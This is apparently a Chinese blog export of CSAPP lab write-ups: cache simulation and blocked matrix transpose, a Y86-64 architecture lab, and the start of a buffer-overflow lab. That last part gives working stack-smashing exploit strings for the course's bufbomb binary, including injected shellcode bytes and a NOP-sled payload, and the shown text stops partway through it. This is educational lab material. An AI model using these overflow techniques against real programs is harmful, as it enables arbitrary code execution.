总体没有什么比较好讲的地方。最主要就是确定好数据结构，理解清楚L S M三个指令之间的区别就可以了。不过笔者在这道题上面却卡了特别久，原因在于对于这几个指令的理解不够深，然后没怎么思考就直接写，导致出了一些问题，找bug花了很长时间，最后发现从一开始的思路就错了，于是才推倒重来。 首先，我们需要用到getopt函数来解析命令行参数。这个函数的用法网上有很多，直接搜索就可以找到很多有用的资料，这里不赘述了。 然后，我们来看一下对于四个指令，I指令我们不需要管，可以直接忽略。剩下L S M三个。一个合格的cache应该做到： 对于load指令，从内存中读取，首先我们需要判断要读取的地址是否有放在缓存当中，有的话就是cache hits，直接返回。没有的话就是cache misses，这个时候需要从内存中读取，然后我们还要将这个地址及其对应的值放入缓存当中。 对于store指令，往内存中写入，首先我们还是需要判断要存储的目标地址是否放在缓存当中。如果有的话，由于我们采用的是write back策略，我们只需要将值存储在cache当中，只有当其要被替换时，我们才将其写入到内存当中。如果没有的话，发生cache misses这个时候我们需要从内存中读取，在放入缓存当中，在缓存中进行修改。 对于modify指令，其实就是先执行load指令，再执行store指令。 实验要求我们输出hits，misses, evicts的次数，并不需要保存缓存中每一个block的值，并且，题目保证了load和store的时候不会越过某一个block的边界，进一步使题目变简单。细心的你可能会发现，我们不需要对三种指令分别进行相应操作。load 和 store指令在本题中没有区别。我们可以将这两个指令分别拆分成两个部分： search 搜索对应的set块中是否存在缓存，存在的话则cache hits，更新lru后直接返回，否则发生cache misses，进行第二步 insert 首先判断当前set块中是否还存在空的line，存在的话我们将其填上，然后返回。不存在的话发生cache evicts，这个时候，由于我们不需要管各个地址中的值，只需要更新一下lru和tag即可。 对于modify，由于load如果缓存中不存在的时候，会从内存中找并且放入缓存当中，因此，store指令一定是cache hits。我们相当与只需要执行load，然后hits++即可。 附：lru(least recently use)在本题中用时间戳表示。每读取一个指令时间戳+1。因此可以保证后一个进缓存的或者后一个被访问到的lru一定更大。我们每次替换的时候只需要找lru最小的那个即可。 核心代码如下：1234567891011121314151617181920while(fscanf(fs, "%s %llx,%d", is, &amp;address, &amp;size) != EOF) &#123; if (is[0] == 'I') continue; address &gt;&gt;= blockSize; set = address % maxSet; address &gt;&gt;= setNum; tag = address; struct Line* line = sets[set].line; int m = sets[set].m; // m 表示编号为set中已经用了的行数(m &lt;= E) if (search(line, m, tag, lru) != -1) hits++; // cache hits 时search返回-1 else &#123; misses++; int pos = try_insert(line, m, tag, lru); // try insert 如果有空位，返回-1，没有空位，则返回lru最小的那个值 if (pos != -1) &#123; evicts++; evict(line, pos, tag, lru); // 将lru最小的那个line替换掉 &#125; else sets[set].m++; &#125; if (is[0] == 'M') hits++; lru++;&#125; part B 这道题总体来说还是挺难的。尤其是64 * 64的那个部分。笔者最后也想不出比较好的办法。在参考了网上的一些资料之后，最终才拿到了满分。当然32 * 32和61 * 67那块还是比较简单的。题目所给的cache的参数为s = 5, b = 5, E = 1，于是我们知道，这是一个直接映射的cache，sets总数为32。记住cache的参数对于题目的解决及其重要。 32 * 32 首先，这道题其实和之前的performance lab很像。不过我们的目的是减少cache misses的次数，而不是减少cpe，因此重心应该放在cache上。我们可以画一个表来表示出各个元素映射到的set编号。由于32byte的block恰好可以放8个int变量，而一行一共有32个，也就是说每一行占用了4个set，8行可以将所有set填满。第九行开始则有重复之前的周期。因此，我们可以采用8 * 8的分块法，尽可能地减少miss数。 当然，如果你直接这样做，你会发现，这样还是通不了，miss数为三百多，而满分是300以内。其实还有一个重要的可以用到的优化(笔者一开始也没有注意到)。 官方给的文档中有提示，我们最多只能用到12个局部变量。而目前我们仅用了4个(四个循环)。还有8个可以用，并且8个还恰好就是一个set能存放的int数，这个时候我们发现，我们可以先将A矩阵中一整个块(8个变量)取出来，放在局部变量当中，然后再逐一赋值给B矩阵中对应的位置，这样可以避免掉很多不必要的miss(A矩阵每一个块最多只会发生1次miss，而且是必要的)，避免了A矩阵和B矩阵相互争夺某一个set导致的conflict miss。于是我们就可以成功地将miss数减少到300以内。成功解决。代码如下：12345678910111213141516171819202122#define K 8int t1, t2, t3, t4, t5, t6, t7, t0;for (i = 0; i &lt; N; i+=K)for (j = 0; j &lt; M; j+=K)for(int l = i; l &lt; i+K &amp;&amp; l &lt; N; l++) &#123; t0 = A[l][j]; t1 = A[l][j+1]; t2 = A[l][j+2]; t3 = A[l][j+3]; t4 = A[l][j+4]; t5 = A[l][j+5]; t6 = A[l][j+6]; t7 = A[l][j+7]; B[j][l] = t0; B[j+1][l] = t1; B[j+2][l] = t2; B[j+3][l] = t3; B[j+4][l] = t4; B[j+5][l] = t5; B[j+6][l] = t6; B[j+7][l] = t7;&#125; 61 * 67 为什么要把这个放在这个地方呢？当然是因为这个比较简单了。61 * 67长宽均是质数，很大一定程度上使得miss数会少一些，当然，这也使得很难通过一些优化将miss减少到一个很低的数值。题目要求的miss数是2000以内，其实只要分块的大小选取得当就很简单了。笔者选择的是16 * 8的块，当然，16 * 16的听说也可以。这个比较随意了，就是一个调参的过程而已。理解清楚之后，和前面那道32 * 32的基本没有区别，代码就不贴了，意义不大。 64 * 64 这个应该就是这个lab最难的一个点了。由于每一行有64个int值，因此，每一行需要占用8个set，即4行就可以把set填满。因此，如果还是采用8 * 8的分块的话，第5～8行占用的set和第1～4行是一样的，这就会导致B矩阵每一次取值都是miss。总的miss率会特别高，显然不恰当。 而如果我们尝试这采用4 * 4的分块法呢？很明显，4 * 4可以避免上面的这种情况。然而又带来了另一个问题，4 * 4中cache的利用率太低了，每次读取8个int，最后用到的却只有4个，因此，这种做法最后miss数大概是1600+，离满分还有很大距离。笔者就是在这里想了很久还是不懂。最后还是去网上看了一下一些其他的思路，最后才恍然大悟(但总觉得这道题有点太取巧了)。下面是我最后获得满分的一个思路(如果涉及侵权，请及时联系我删除)： 为了使得cache的利用率达到最大，我们还是得采用8 * 8的分块法，但是，同样的又要避免第5～8行和第1～4行发生conflict miss，我们不能一次性对一整列8个数字进行填充。最后我们采用的策略基于矩阵转置以下的性质： 对于任意矩阵A，我们将A的转置矩阵记为AT。对于每一个8 * 8的块，我们可以将其分成4个4 * 4的子矩阵。分别记为A1，A2，A3，A4。对与A的转置操作，我们可以分解为如下： 由此，我们可以将整个8 * 8的矩阵的转置分解为以下的三个步骤。 对A矩阵的上半部分处理，每次读取A的一行，将A坐上角部分转置后放在B的左上角处，将A右上角转置后放在B的右上角 对A矩阵的左下角部分进行处理，按列读取A的右下角中的每一列(4个数字)，再按行读取B右上角中的每一行，然后将A读取到的四个数字横放在B的右上角，再将B读取到的四个数字放在B的左下角。本质上其实就等价于将左下角转置后放在B的右上角，将B右上角中上一步得到的数字放在了B的左下角。 对A矩阵的右下角部分进行处理，将A右下转置并放到B右下当中 其中，第二步是最关键的部分。为什么这样能够减少miss数呢？如果我们假设4 * 4矩阵平均的miss数为n的话，对于上面三个步骤，我们每一步产生的miss数均大致为n，也就是说，对于一个8 * 8的矩阵，我们的miss数由原先所需的4n降低到了3n。第一步和第三步为n这个很好理解，第二步建议自己再画图理解清楚。最后我们得到的miss数为1100+，而4 * 4的分块约为1600，这也和我们的估计值基本相当。 以下是代码，仅供参考：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081int t1, t2, t3, t4, t5, t6, t7, t0;for (i = 0; i &lt; N; i+=K) &#123; for (j = 0; j &lt; M; j+=K) &#123; // 以下循环将A左上转置后移动到B坐上 // 将A右上转置后移动到B右上 for(int ii = i; ii &lt; i + 4; ii++) &#123; t0 = A[ii][j]; t1 = A[ii][j+1]; t2 = A[ii][j+2]; t3 = A[ii][j+3]; t4 = A[ii][j+4]; t5 = A[ii][j+5]; t6 = A[ii][j+6]; t7 = A[ii][j+7]; B[j][ii] = t0; B[j+1][ii] = t1; B[j+2][ii] = t2; B[j+3][ii] = t3; B[j][ii+4] = t4; B[j+1][ii+4] = t5; B[j+2][ii+4] = t6; B[j+3][ii+4] = t7; &#125; // 将A左下角转置并移动到B右上角 // 将B右上角移动到B左下角 for(int jj = j; jj &lt; j + 4; jj++) &#123; t0 = A[i+4][jj]; t1 = A[i+5][jj]; t2 = A[i+6][jj]; t3 = A[i+7][jj]; t4 = B[jj][i+4]; t5 = B[jj][i+5]; t6 = B[jj][i+6]; t7 = B[jj][i+7]; B[jj][i+4] = t0; B[jj][i+5] = t1; B[jj][i+6] = t2; B[jj][i+7] = t3; B[jj+4][i] = t4; B[jj+4][i+1] = t5; B[jj+4][i+2] = t6; B[jj+4][i+3] = t7; &#125; // 将A右下转置后移动到B右下 t0 = A[i+4][j+4]; t1 = A[i+4][j+5]; t2 = A[i+4][j+6]; t3 = A[i+4][j+7]; t4 = A[i+5][j+4]; t5 = A[i+5][j+5]; t6 = A[i+5][j+6]; t7 = A[i+5][j+7]; B[j+4][i+4] = t0; B[j+5][i+4] = t1; B[j+6][i+4] = t2; B[j+7][i+4] = t3; B[j+4][i+5] = t4; B[j+5][i+5] = t5; B[j+6][i+5] = t6; B[j+7][i+5] = t7; t0 = A[i+6][j+4]; t1 = A[i+6][j+5]; t2 = A[i+6][j+6]; t3 = A[i+6][j+7]; t4 = A[i+7][j+4]; t5 = A[i+7][j+5]; t6 = A[i+7][j+6]; t7 = A[i+7][j+7]; B[j+4][i+6] = t0; B[j+5][i+6] = t1; B[j+6][i+6] = t2; B[j+7][i+6] = t3; B[j+4][i+7] = t4; B[j+5][i+7] = t5; B[j+6][i+7] = t6; B[j+7][i+7] = t7; &#125;&#125; 关于driver.py文件 driver.py是用python语言编写的脚本文件。在做这个任务时，笔者电脑中python的版本是3.7。运行driver.py的时候，出现了异常错误。经打开后发现，这个文件中的python的版本应该是3.0以前的，由于python2.x 和 python3.x的一些语法做了大幅度的修改，因此该文件无法正常运行。如果你也遇到了同样的错误，可以尝试这用以下方法解决： 将文件中所有print 后面的表达式加上一个括号。如print “Hello world” 应改为 print(“Hello world”)。python3.0开始就已经不再使用print x这种类型的表达式了。 将所有调用到subprocess.Popen函数的式子括号内再加上universal_newlines=True参数。如83～84行应该改为p = subprocess.Popen(“./test-trans -M 61 -N 67 | grep TEST_TRANS_RESULTS”, shell=True, stdout=subprocess.PIPE, universal_newlines=True) 89行改为csim_cscore = list(map(int, resultsim[0:1])) 关于前面的archlab-32和performance-lab 这两个实验没有写博客。archlab-32和archlab题目上基本没有什么很大的差别，大体的解决思路类似，因此基本上没有什么重复写博客的必要。然后performance-lab则是因为这个实验难度比较小，没有什么可以写的(虽然这个实验我还是有做的)，基本上就是简单的loop unrolling加上分块就可以拿到比较好的分数了。而且题目和Chapter 6的最后两道课后题很类似。这里就不再赘述了。]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
        <tag>cache</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[csapp-Archlab]]></title>
    <url>%2F2019%2F01%2F18%2Fcsapp-Archlab%2F</url>
    <content type="text"><![CDATA[序 这是csapp系列的第五篇文章。具体题目请见官网。本文主要讲csapp中的architecture lab的流程和心得。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话)。 同样的，在正式开始实验之前，建议先把官方的资料看一遍，保证对实验需要做什么，怎么做有一定的了解。总体来说，本实验在不追求满分的情况下，还是很容易通过的。主要难度都是在part C上，尤其要优化到高分十分困难，笔者最后的得分为56.3/60.0，仅供参考。 architecture lab 实验要求 这个实验总共分为三个部分，part A, part B, part C。其中，第一部分要求我们将三个用C写的函数翻译成y86-64指令，第二部分要求我们往seq ISA中添加一个新的指令iaddq。第三个部分给了我们一个ncopy的函数和一个pipeline的hcl文件，要求我尽可能地加快程序运行的速度。结果是用CPE(cycles per element)来衡量。达到9.0即算实验通过，7.5为满分。 实验文件(主要用到的在三个文件夹当中)misc：part A 需要用到的文件夹seq： part B 所在文件夹pipe：part C 所在文件夹 实验目的 加深对CPU的指令集架构的了解，理解pipeline的基本实现原理 理解hardware和software之间的基本联系。简单了解它们之间是如何配合协作的 掌握一些程序优化的简单方法 y86-64 模拟器的配置 个人认为，这个应该是本实验最麻烦的一个点了。花了很长的时间，出了各种bug，下面进行安装过程进行简单的介绍。 所用系统为:arch-linux。不同版本对同一个问题的解决方法可能不太一样，但大体上有相似之处，下面仅供参考 tcl/tk 如果不想安装GUI界面的同学可以忽略此步 首先，本实验比较老，需要用到的tcl/tk版本号为8.5，8.6以上的版本没办法正常使用。然而，现在直接下载默认的应该是8.6版本的，因此我们需要制定版本号。在arch下，本人是直接使用yay（需要自行安装）进行下载。 yay tcl85 // yay tk85 这样的命令行即可。然后我们进入sim文件夹下。使用make编译。发现报错了。出现了类似这样的错误信息。 我们需要更改makefile文件。如下图所示(记得对照清楚一下)。 再次进行编译。又报出新的错误。错误信息大概是这样。 psim.c:23:10: fatal error: tk.h: No such file or directory #include &lt;tk.h&gt;compilation terminated. 看错误信息，我们发现，编译的时候找不到tk.h这个函数库。因此，我们去系统的函数库里面看一下，进入Root/usr/include文件夹下，ctrl+f搜索，我们发现tk.h放在了tk8.5这个文件夹下，因此编译的时候在include文件夹下找不到tk.h。我们只需要将psim.c中的tk.h更改为tk8.5/tk.h即可。(同理，ssim.c也需要修改) 好了，这个时候再次编译，我们又发现还是过不了。出现了类似这样的错误信息。 /usr/bin/ld: /tmp/cc44VPBY.o:(.data.rel+0x0): underfined reference to ‘matherr’ matherr没有定义？？这是怎么回事。我们进入matherr所在文件(psim.c和ssim.c)看一下。找到了这样的两行代码： extern int matherr();int *tclDummyMathPtr = (int *) matherr; 直接注释掉即可。最后，我们再进行编译。在sim文件夹下make clean; make 我们成功地完成了GUI界面的编译。当然，要是过不了也没有什么关系，我们可以把上面图片中makefile那三行注释掉，这样编译出来的是文本界面，但不需要tcl/tk，也就不会一直报错了。 实验正文part A 这部分其实没什么好讲的。就是简单地把一个函数翻译成y86-64代码而已。在misc文件夹下新建文件sum.ys，把自己翻译的代码打进去然后用yas编译，yis运行即可，最终%rax的数据为0xcba即正确了。自己可以进行校对。下面是我的sum.ys的代码。其余两个不贴上来了。主要是注意一下一开是要先设置pos，还有把栈顶放在%rsp上面即可。123456789101112131415161718192021222324252627282930313233343536.pos 0init: irmovq Stack, %rsp call Main halt .align 8ele1: .quad 0x00a .quad ele2ele2: .quad 0x0b0 .quad ele3ele3: .quad 0xc00 .quad 0Main: irmovq ele1,%rdi call sum_list retsum_list: irmovq $0,%rax jmp testloop: mrmovq 0(%rdi),%rcx addq %rcx,%rax mrmovq 8(%rdi),%rcx rrmovq %rcx,%rditest: andq %rdi,%rdi jne loop ret .pos 0x100Stack: part B 这个部分同样比较简单，添加一个IIADDQ指令。文件位于/seq/seq-full.hcl 我们只需要在以下几个变量中添加IIADDQ的判断即可。 instr_valid need_regids need_valC dstE中结果为rB的分支 aluA中结果为valC的分支 aluB中结果为valB的分支 setCC 经过资料中的几个测试后，该题顺利解决。 part C 这道题很难，尤其是如果要追求满分的话。当然，要有分也没那么容易。在pipe文件夹下： ./correctness.pl // 检测自己的答案是否正确./benchmark.pl // 测试自己的分数是多少 这道题我们能操作的文件就只有pipe.hcl和ncopy.ys。也就是说，分别从硬件和软件两个方面进行优化。首先是hcl文件，很显然，官方资料已经提示了我们，本题需要实现iaddq指令，这样做起来方便很多，可以将CPE降到13左右吧。虽然还是0分。具体和part B极其相似，这里不再赘述。 由于资料中还提示我们，建议去看loop unrolling的部分，这告诉了我们，本题最大的优化在循环展开这里。于是，笔者不得不先提前去看了一下书上循环优化部分的内容。为什么循环优化能够提高那么多呢？ 注意到我们的每次循环过程中，迭代器都要+1，并且src和dst两个指针也要对应地发生移动，然而，这样的指令对于我们答案的得出并没有实质性的直接帮助，因此，我们应该尽量减少这样的指令的产生比如：1234567int sum = 0;for (int i = 0;i &lt; n; i++)sum += a[i];int sum = 0;for (int i = 0;i &lt; n; i+=2)sum = sum + a[i] + a[i+1]; 两个程序进行对比，很明显，下面的程序的效率要远远高于上面那个。尤其当n越大时，效果更明显。而题目给的程序中，需要递增的有三个数，这就使得循环优化变得更加重要。对于循环k路的选择上面，个人选择了k = 8。即每次n的变化应该是8。总体上来说，和四路的效率比较接近。具体实现过程中，整体思路是，先将n - k, 然后再进行n/k轮迭代，最后再把余数进行处理。具体可以见最下方的参考 进行了循环优化以后，我们还发现，程序中有类似这样的两行。 mrmovq (%rdi),%r10rmmovq %r10,(%rsi) 记性比较好的读者应该会记得，书中有提到过这样的例子。第二行的rmmovq指令执行到decode stage时，上面那一行还在execute stage，这个时候，我们并不知道(%rdi)的值具体是多少，也就是说，这个时候我们没办法通过data forwarding将数据送往decode stage。于是，rmmovq指令只好停留在本阶段，于是我们浪费了一个clock cycle，这是一种典型的load interlock, 处理办法是将另一个指令插入这两个指令中。然而下面的andq %r10,%r10指令我们也用不了，同样需要读取%r10，无法避免cycle的浪费. 因此，我们选择将下面的一个mrmovq提到上面来，即变成 mrmovq (%rdi),%10mrmovq 8(%rdi),%r9rmmovq %r10,(%rsi) 这样以来就不会发生cycle的浪费了。这个时候我们再进行测试的话，分数应该已经挺高了。当然，还有一些小小的优化可以调整。比如余数的处理上等等。这里给一个看到的处理得比较好的文章供参考，这篇文章作者还使用了一个三叉搜索树构造跳转表，再一次提高了效率(已经接近满分了)。这里我就不再赘述了。 其实我们会看到，想要提高CPE(CPI)，其实最主要就是三个方面，一个是use/load的冲突，如上面的mrmovq和rmmovq，这会消耗掉一个cycle；第二个是return语句，由于pipeline的设计，我们不知到会跳哪个位置，只能等到return执行到memory stage的时候才能确定，这将会浪费掉三个cycle；还有一个就是JXX中的条件跳转(非条件没有影响)，一旦分支预测错误，将会浪费掉两个cycle，而跳转指令在我们的程序中又特别的常见，因此，这是我们很大的一个优化方向，不仅是在这个实验当中。对于一个跳转指令，在特定的ISA下，我们应该尽量想办法在软件层面做处理，提高分支预测的准确率(比如在可能的情况下用data flow替换掉control flow)。书中也提到，现代的处理器的stage是远不止五个的，一旦分支预测出现错误，处理器调整的开销将长达十几个时钟周期。这个应该也是我看第四章留下的印象最深刻的地方吧。 下面是我的代码(其中也用到了其他一些小优化，比如分支的调整之类的)：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138xorq %rax,%rax # count = 0iaddq $-8,%rdx # n - 8jl Test # if n &lt; 8 jump to TestLoop: mrmovq (%rdi),%r10 mrmovq 8(%rdi),%r9 andq %r10,%r10 rmmovq %r10,(%rsi) jle Npos1 iaddq $1,%raxNpos1: andq %r9,%r9 rmmovq %r9,8(%rsi) jle Npos2 iaddq $1,%raxNpos2: mrmovq 16(%rdi),%r10 mrmovq 24(%rdi),%r9 andq %r10,%r10 rmmovq %r10,16(%rsi) jle Npos3 iaddq $1,%raxNpos3: andq %r9,%r9 rmmovq %r9,24(%rsi) jle Npos4 iaddq $1,%raxNpos4: mrmovq 32(%rdi),%r10 mrmovq 40(%rdi),%r9 andq %r10,%r10 rmmovq %r10,32(%rsi) jle Npos5 iaddq $1,%raxNpos5: andq %r9,%r9 rmmovq %r9,40(%rsi) jle Npos6 iaddq $1,%raxNpos6: mrmovq 48(%rdi),%r10 mrmovq 56(%rdi),%r9 andq %r10,%r10 rmmovq %r10,48(%rsi) jle Npos7 iaddq $1,%raxNpos7: andq %r9,%r9 rmmovq %r9,56(%rsi) jle Npos8 iaddq $1,%raxNpos8: iaddq $64, %rdi # add the *src, *dst iaddq $64, %rsi iaddq $-8, %rdx # sub i jge Loop # loopTest: # n + 8 to deal with remaining numbers iaddq $8,%rdx jne Rem1 retRem1: mrmovq (%rdi), %r10 mrmovq 8(%rdi), %r9 andq %r10, %r10 jle Pos1 iaddq $1, %raxPos1: rmmovq %r10, (%rsi) iaddq $-1, %rdx jne Rem2 retRem2: andq %r9, %r9 jle Pos2 iaddq $1, %raxPos2: rmmovq %r9, 8(%rsi) iaddq $-1, %rdx jne Rem3 retRem3: mrmovq 16(%rdi), %r10 mrmovq 24(%rdi), %r9 andq %r10, %r10 jle Pos3 iaddq $1, %raxPos3: rmmovq %r10, 16(%rsi) iaddq $-1, %rdx jne Rem4 retRem4: andq %r9, %r9 jle Pos4 iaddq $1, %raxPos4: rmmovq %r9, 24(%rsi) iaddq $-1, %rdx jne Rem5 retRem5: mrmovq 32(%rdi), %r10 mrmovq 40(%rdi), %r9 mrmovq 48(%rdi), %r8 andq %r10, %r10 jle Pos5 iaddq $1, %raxPos5: rmmovq %r10, 32(%rsi) iaddq $-1, %rdx jne Rem6 retRem6: andq %r9, %r9 jle Pos6 iaddq $1, %raxPos6: rmmovq %r9, 40(%rsi) iaddq $-1, %rdx jne Rem7 retRem7: andq %r8, %r8 jle Pos7 iaddq $1, %raxPos7: rmmovq %r8, 48(%rsi) 总结 这个实验本身来说难度并不能算大，甚至比课后练习还要稍微容易一点，但是需要对CPU的pipeline有比较清晰的了解，否则做起来会特别的吃力。由于我自己本身是读软件方面的，对硬件很多东西其实也不怎么了解(基本上师兄在说的时候也是觉得这一章可以不用怎么看)，加上现在才大一，很多知识，比如电路方面的都还没学，看得时候都要查一下一些概念什么的。当然最后我还是坚持顽强地把它啃下来了(算上实验和各种其他杂七杂八的东西，总共花了一个星期多一点吧)。花了很长的时间，尤其是pipeline那一块，到现在都觉得自己的理解并不是很到位，还有一些小细节没有搞清楚。我也不知到为什么一个读软件的要对涉及到已经几乎是硬件层面的东西要这么花时间，我也不知到自己花了这么长的时间去看这个究竟有没有意义。可能这就是对计算机的热爱吧(逃]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
        <tag>y86-64</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[csapp-Buflab]]></title>
    <url>%2F2019%2F01%2F15%2Fcsapp-Buflab%2F</url>
    <content type="text"><![CDATA[序 这是csapp系列的第四篇文章了。具体题目请见官网。本文主要讲csapp中的buflab的部分流程和心得。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话)。 本文建立在csapp完成了attacklab的基础上。如果还没完成上一个实验，请先将其完成再进行本实验。不过个人觉得上一个实验能够独立完成的话，这个实验难度就真的很小了。同样的，还是很建议先把官方给的资料看了之后再来做这个实验。不过笔者这边电脑看的时候有一些乱码，不知道其他电脑会不会一样。 buflab 实验要求 这个实验要求我们使用缓冲区溢出漏洞对bufbomb进行攻击。总共5个关卡。 实验文件bufbomb：我们需要攻击的对象hex2raw：帮助我们成功攻击字符串的文件makecookie：根据用户id产生对应的cookie (./makecookie [userid] 即可生成, 注意将[userid]替换成自己喜欢的字符串)12345678910void test() &#123; int val; val = getbuf(); printf("No exploit. Getbuf returned 0x%x\n", val);&#125;unsigned getbuf() &#123; char buf[BUFFER_SIZE]; Gets(buf); return 1;&#125; buflab 的一些注意点 首先，本实验和上一个实验相比的话，难度还是要小了很多的。基本上除了最后一个level之外都没什么难度。但有一些不一样的细节需要注意 1. bufbomb在编译的时候加上了 -m32 参数，意味着无论你的电脑是否是64位系统，编译器遵循的都是IA-32规则。也就是说，我们需要用到的函数地址，指针等都是32位，这点和上一个实验不同，需要很小心。 2. 本实验中参数的传递比较接近RISC，参数是放在栈当中进行传递的，而不是放在%rdi,%rsi这样的寄存器上。所以建议完成本实验时，还是要多画图，结合图像来看的话要简单易懂很多。 3. 本实验和上一个实验基本上的架构是很相似的，我们需要做的事情也差不多，因此一些做法可以借鉴上一个实验中的相关关卡。 level 0 首先，我们还是一样，先用objdump反编译，得到bufbomb.txt文件，便于查看。前面四道题中，都调用到了这样的函数：123456#define NORMAL_BUFFER_SIZE 32unsigned getbuf() &#123; char buf[NORMAL_BUFFER_SIZE]; Gets(buf); return 1;&#125; 可以看到，和上一个实验基本没有区别。对于第一题来说，我们需要成功进入smoke()函数，只需将要丢弃的一大段字节随便填充上去，最后overwrite返回的地址即可。注意，这里的地址只有四个字节。答案就不贴了。 level 1 这道题需要我们val这个数值传入fizz()函数，并且val等于我们的cookie。很简单，注意到这道题中传递参数是用栈来实现的，我们只要把cookie放在栈上即可，连代码注入都不需要。但一定要很小心字节的顺序，在这种问题上卡住还是很吃亏的。答案如下(其中60可以随意替换成其他值)： 60 60 60 60 60 60 60 6060 60 60 60 60 60 60 6060 60 60 60 60 60 60 6060 60 60 60 60 60 60 6060 60 60 60 60 60 60 6060 60 60 60 42 8c 04 08 // 跳转到fizz函数入口60 60 60 60 c0 e5 c4 53 // 此行为cookie，注意前面的四个字节不能省掉 level 2 对于这道题，我们需要修改一个全局变量global_value的值，使其等于cookie。这道题就需要用到代码注入了。123mov $0x53c4e5c0,%eax // 左侧的值为cookie，我们先将其移动到%eaxmov %eax,0x804d100 // 放入global_value所在的内存单元(这里的地址可以直接看反汇编文件得到)ret 将上面的汇编代码编译，并反编译之后，我们就得到了它对应的机器级表示。在放进我们的文件(这里是bufbomb3.txt)当中，使用cat bufbomb3.txt | ./hex2raw | ./bufbomb -u [userid] 命令即可。我的bufbomb.3txt文件内容为： 60 60 60 60 60 60 60 60b8 c0 e5 c4 53 a3 00 d104 08 c3 60 60 60 60 6060 60 60 60 60 60 60 6060 60 60 60 60 60 60 6060 60 60 60 00 39 68 559d 8c 04 08 level 3 这道题开始有一定的难度了。本题目要求我们使用代码注入并且不能破坏原有的栈数据，最后使得getbuf函数返回cookie。有比较多的细节需要我们去注意。 首先，我们需要想到，怎样才不会破坏原有的栈数据呢？首先，我们不能覆盖到return address再往上的数据，也就是说，我们输入的字符串长度不能超过48，否则原有的某些数据可能会被我们覆盖。其次，在bufbomb的反汇编文件中，getbuf有push %ebp这样的指令将%ebp保存在栈上，而当我们覆盖了return address后，显然这个数据就丢失了。那怎么办？注意到这道题目中栈的位置不会发生改变。我们可以用gdb调试，在这个函数打一个断点，然后打印出放在栈上的这个值。到时在注入代码的时候记得把这个值放到%ebp即可。 为了能够顺利地回到test函数中，我们还要查看一下test函数在call getbuf后的下一个指令的位置，在我们的代码中要将PC更改为这个值，这样程序看起来就像是从getbuf当中返回了。 因此，我们可以得到答案： 60 60 60 60 60 60 60 60b8 c0 e5 c4 53 68 be 8d // 将cookie放到%eax, 并把test中的下一个指令位置push进栈04 08 c3 60 60 60 60 6060 60 60 60 60 60 60 6060 60 60 60 60 60 60 6050 39 68 55 00 39 68 55 // 后面四个字节跳转到我们注入了代码的地址，前面四个字节对应着%ebp的值，pop的时候就会被放回%ebp了 level 4 不得不说，这道题当纯看题目要求时，觉得还是很变态的。首先，我们需要做到level3中的所有要求。其次，getbuf会被调用5次，我们需要每一次都能满足要求。并且，比较难的一点是，每一次getbuf的时候，stack的%esp(%ebp)指针的位置是不确定的，这也就意味着，我们没办法精确地跳转到我们注入的代码的位置。当然，如果还有印象的话，书中有提到对付ASLR的一种办法，就是使用nop指令，nop即no operation，CPU不会进行任何操作，相当与直接跳过这个指令。我们可以在注入的代码前面加入大量的nop，这样的话只要能够跳转到任意一个nop指令，PC就会像滑雪橇一样滑到我们注入的代码。我们只需要在最后的几行实现保存即可。 要保证栈不被破坏，我们在注入的代码中还需要做到以下几点： 1. 找到%ebp对应的值，并将其写入其中。 2. 将cookie放入%eax中，作为返回值 3. 注入代码的末尾需要将testn中的下一条指令push进栈当中，这样才能顺利返回到testn。同时，整个代码的总字符数必须为528，多了就溢出，栈被破坏，少了的话没办法覆盖掉return address。 其中2和3和上一个level没有区别，最主要是第一个，既然%ebp已经被覆盖了，我们要怎么知道它原先的值是多少呢？其实，我们可以从反汇编文件得到答案。%ebp其实就是testn的堆栈帧，我们看testn函数，它在push操作后，将%esp赋值给了%ebp，然后自己减掉了0x24，也就是说，call getbuf刚进入时，%esp + 0x24 + 4 = %ebp， 通过画图像，我们就可以很容易得到相关的规律了。小心push的时候%esp会-4。 以下是我的答案： 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 b8 c0 e5 c4 53 68 3a8e 04 08 8d 6c 24 2c c3 90 90 90 